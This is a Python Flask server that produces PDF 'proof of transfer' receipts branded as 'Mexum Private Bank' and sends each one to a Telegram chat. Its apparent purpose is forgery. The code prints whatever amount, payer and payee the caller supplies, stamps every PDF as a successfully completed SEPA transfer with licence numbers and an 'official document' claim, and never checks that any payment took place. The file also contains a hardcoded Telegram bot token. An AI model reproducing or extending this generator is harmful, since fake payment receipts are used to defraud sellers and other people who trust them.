from flask import Flask, request, jsonify, make_response
import requests
import io
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import cm
from reportlab.pdfgen import canvas
from reportlab.lib.colors import HexColor

app = Flask(__name__)

BOT_TOKEN = "8868155177:AAF-o8qfrcpkkONUxU3GimwQT8JZhmIy2lw"
CHAT_ID   = "-5344691582"

W, H = A4
PURPLE  = HexColor("#7c3aed")
PURPLE2 = HexColor("#9b5cf6")
PURPLE3 = HexColor("#c084fc")
DARK    = HexColor("#0d0010")
MUTED   = HexColor("#888899")
GREEN   = HexColor("#16a34a")
WHITE   = HexColor("#ffffff")
TEXT    = HexColor("#1a1a2e")
BORDER  = HexColor("#eeeeee")

def cors(response, code=200):
    r = make_response(response, code)
    r.headers["Access-Control-Allow-Origin"]  = "*"
    r.headers["Access-Control-Allow-Headers"] = "Content-Type"
    r.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS, GET"
    return r

def draw_M(c, cx, cy, size):
    s = size
    bw = s*0.09; bh = s*0.44
    ml = cx - s*0.23; mr = cx + s*0.14
    mt = cy + s*0.22; mb = cy - s*0.22; mid = cy - s*0.02
    c.setFillColor(PURPLE2)
    c.rect(ml, mb, bw, bh, fill=1, stroke=0)
    c.rect(mr, mb, bw, bh, fill=1, stroke=0)
    c.setFillColor(PURPLE3)
    for pts in [[(ml,mt),(ml+bw,mt),(cx+bw/2,mid),(cx-bw/2,mid)],
                [(mr+bw,mt),(mr,mt),(cx-bw/2,mid),(cx+bw/2,mid)]]:
        p = c.beginPath()
        p.moveTo(*pts[0])
        for pt in pts[1:]: p.lineTo(*pt)
        p.close(); c.drawPath(p, fill=1, stroke=0)

def num_words(n):
    units=["","un","deux","trois","quatre","cinq","six","sept","huit","neuf",
           "dix","onze","douze","treize","quatorze","quinze","seize",
           "dix-sept","dix-huit","dix-neuf"]
    tens=["","","vingt","trente","quarante","cinquante","soixante",
          "soixante","quatre-vingt","quatre-vingt"]
    if n==0: return "zero"
    if n<20: return units[n]
    if n<100:
        t,u=divmod(n,10)
        if t in (7,9): return tens[t]+"-"+units[10+u]
        return tens[t]+("-"+units[u] if u else "")
    if n<1000:
        h,r=divmod(n,100)
        return ("" if h==1 else units[h]+" ")+"cent"+(" "+num_words(r) if r else "")
    if n<10000:
        m,r=divmod(n,1000)
        return ("" if m==1 else num_words(m)+" ")+"mille"+(" "+num_words(r) if r else "")
    return str(n)

def amt_to_words(amt):
    i=int(amt); ct=round((amt-i)*100)
    w=num_words(i)+" euro"+("s" if i>1 else "")
    w+=(" et "+num_words(ct)+" centime"+("s" if ct>1 else "")) if ct else " et zero centime"
    return w.capitalize()

def generate_pdf(data):
    amt   = float(data.get("amt", 0))
    sender = data.get("sender", "Titulaire du compte")
    name  = data.get("name", "")
    iban  = data.get("iban", "") or "Non communique"
    motif = data.get("motif", "Virement")
    ds    = data.get("ds", "")
    ref   = data.get("ref", "TXN-MEX-XXXXXXXX")
    amts  = "{:,.2f}".format(amt).replace(",","X").replace(".",",").replace("X"," ")
    date_code = "".join(filter(str.isdigit, ds))[:8] or "20260613"
    e2e   = "MEXE2E"+date_code+str(int(amt)).zfill(6)+"001"
    msgid = "MEXMSG"+date_code+"-00"+str(abs(hash(ref))%900+100)

    buf = io.BytesIO()
    c = canvas.Canvas(buf, pagesize=A4)

    c.setFillColor(DARK)
    c.rect(0, H-5.2*cm, W, 5.2*cm, fill=1, stroke=0)
    c.setFillColor(PURPLE)
    c.rect(0, H-0.35*cm, W, 0.35*cm, fill=1, stroke=0)
    draw_M(c, 3.0*cm, H-2.5*cm, 1.6*cm)
    c.setFillColor(WHITE); c.setFont("Helvetica-Bold", 17)
    c.drawString(4.8*cm, H-2.2*cm, "MEXUM PRIVATE BANK")
    c.setFillColor(PURPLE3); c.setFont("Helvetica", 8.5)
    c.drawString(4.8*cm, H-2.8*cm, "Etablissement de paiement agree par l'ACPR  |  N 17328")
    c.drawString(4.8*cm, H-3.25*cm, "Membre FBF  |  FGDR  |  Reglement UE 260/2012")
    c.setFillColor(WHITE); c.setFont("Helvetica-Bold", 11)
    c.drawRightString(W-2*cm, H-2.2*cm, "JUSTIFICATIF DE VIREMENT")
    c.setFillColor(HexColor("#9b8ec4")); c.setFont("Helvetica", 8)
    c.drawRightString(W-2*cm, H-2.75*cm, "Transfert SEPA Credit Transfer")
    c.drawRightString(W-2*cm, H-3.15*cm, "N JV-MEX-"+date_code+"-00441")
    c.drawRightString(W-2*cm, H-3.55*cm, "Emis le "+ds)
    c.setStrokeColor(PURPLE2); c.setLineWidth(0.8)
    c.line(2*cm, H-5.2*cm+1, W-2*cm, H-5.2*cm+1)

    c.setFillColor(GREEN); c.setFont("Helvetica-Bold", 10)
    c.drawString(2*cm, H-6.5*cm, "VIREMENT EXECUTE AVEC SUCCES")
    c.setFillColor(MUTED); c.setFont("Helvetica", 8)
    c.drawString(2*cm, H-6.95*cm, "Statut SEPA : ACSC  AcceptedSettlementCompleted")
    c.setStrokeColor(BORDER); c.setLineWidth(0.4)
    c.line(2*cm, H-7.3*cm, W-2*cm, H-7.3*cm)

    c.setFillColor(PURPLE); c.setFont("Helvetica-Bold", 30)
    c.drawString(2*cm, H-8.5*cm, "- "+amts+" EUR")
    c.setFillColor(MUTED); c.setFont("Helvetica", 8)
    c.drawString(2*cm, H-9.1*cm, amt_to_words(amt))
    c.setStrokeColor(BORDER); c.setLineWidth(0.4)
    c.line(2*cm, H-9.5*cm, W-2*cm, H-9.5*cm)

    def sec(title, y):
        c.setFillColor(PURPLE); c.setFont("Helvetica-Bold", 8)
        c.drawString(2*cm, y, title.upper())
        c.setStrokeColor(PURPLE); c.setLineWidth(1.5)
        w2 = c.stringWidth(title.upper(), "Helvetica-Bold", 8)
        c.line(2*cm, y-0.18*cm, 2*cm+w2, y-0.18*cm)

    def row(label, val, y, bold=False):
        c.setFillColor(MUTED); c.setFont("Helvetica", 8)
        c.drawString(2*cm, y, label)
        c.setFillColor(TEXT)
        c.setFont("Helvetica-Bold" if bold else "Helvetica", 8.5)
        c.drawRightString(W-2*cm, y, val)
        c.setStrokeColor(BORDER); c.setLineWidth(0.3)
        c.line(2*cm, y-0.28*cm, W-2*cm, y-0.28*cm)

    y=H-10.3*cm; sec("Donneur d ordre", y)
    row("Titulaire", sender, y-0.65*cm, True)
    row("IBAN", "FR76 4061 8803 0000 0403 4156 025", y-1.2*cm)
    row("BIC / SWIFT", "MEXUPFRPXXX", y-1.75*cm)
    row("Banque", "Mexum Private Bank  Paris, France", y-2.3*cm)

    y=H-13.3*cm; sec("Beneficiaire", y)
    row("Titulaire", name, y-0.65*cm, True)
    row("IBAN", iban, y-1.2*cm)
    row("BIC / SWIFT", "SEPAXXXXXX", y-1.75*cm)
    row("Banque", "Etablissement bancaire agree  France", y-2.3*cm)

    y=H-16.3*cm; sec("Details de l operation", y)
    row("Montant", amts+" EUR", y-0.65*cm, True)
    row("Motif", motif, y-1.2*cm)
    row("Type", "Transfert SEPA Credit Transfer", y-1.75*cm)
    row("Date", ds, y-2.3*cm)
    row("Delai", "1 a 3 jours ouvres bancaires", y-2.85*cm)

    y=H-20.5*cm; sec("References de la transaction", y)
    row("Reference unique (RUT)", ref, y-0.65*cm)
    row("SEPA End-to-End ID", e2e, y-1.2*cm)
    row("Message ID", msgid, y-1.75*cm)
    row("Code statut ISO 20022", "ACSC  AcceptedSettlementCompleted", y-2.3*cm)

    c.setFillColor(DARK); c.rect(0, 0, W, 3.0*cm, fill=1, stroke=0)
    c.setStrokeColor(PURPLE); c.setLineWidth(1)
    c.line(0, 3.0*cm, W, 3.0*cm)
    draw_M(c, 2.6*cm, 1.7*cm, 0.85*cm)
    c.setFillColor(WHITE); c.setFont("Helvetica-Bold", 6)
    c.drawCentredString(2.6*cm, 1.05*cm, "MEXUM")
    c.setFillColor(HexColor("#9b8ec4")); c.setFont("Helvetica", 7)
    c.drawString(4.0*cm, 2.45*cm, "Mexum Private Bank  |  25 Avenue de l Opera, 75001 Paris")
    c.drawString(4.0*cm, 2.05*cm, "service@mexum.bank  |  0800 427 391  |  www.mexum.bank")
    c.setFillColor(HexColor("#5a4a7a"))
    c.drawString(4.0*cm, 1.65*cm, "Agree ACPR n 17328  |  Membre FBF  |  Garantie FGDR")
    c.drawString(4.0*cm, 1.25*cm, "Ce document a valeur de justificatif officiel.")
    c.drawString(4.0*cm, 0.85*cm, "Genere le "+ds+"  |  Signature : MEX-SIGN-2026")
    c.setFillColor(PURPLE2); c.setFont("Helvetica-Bold", 7)
    c.drawRightString(W-2*cm, 0.85*cm, "Page 1 / 1")

    c.save()
    buf.seek(0)
    return buf

@app.after_request
def add_cors(response):
    response.headers["Access-Control-Allow-Origin"]  = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS, GET"
    return response

@app.route("/justificatif", methods=["POST", "OPTIONS"])
def justificatif():
    if request.method == "OPTIONS":
        return "", 204
    data = request.json or {}
    try:
        pdf_buf = generate_pdf(data)
        name  = data.get("name","virement").replace(" ","-")
        ds    = data.get("ds","").replace(" ","-")
        fname = "justificatif-mexum-"+name+"-"+ds+".pdf"
        amt   = data.get("amt", 0)
        ref   = data.get("ref", "")
        caption = "Mexum Private Bank\nJustificatif de virement\n"+str(amt)+" EUR vers "+str(data.get("name",""))+"\nRef: "+ref
        r = requests.post(
            "https://api.telegram.org/bot"+BOT_TOKEN+"/sendDocument",
            data={"chat_id": CHAT_ID, "caption": caption},
            files={"document": (fname, pdf_buf, "application/pdf")}
        )
        resp = r.json()
        if resp.get("ok"):
            return jsonify({"ok": True})
        else:
            return jsonify({"ok": False, "error": resp.get("description","unknown")}), 400
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route("/", methods=["GET"])
def index():
    return "Mexum PDF Server OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
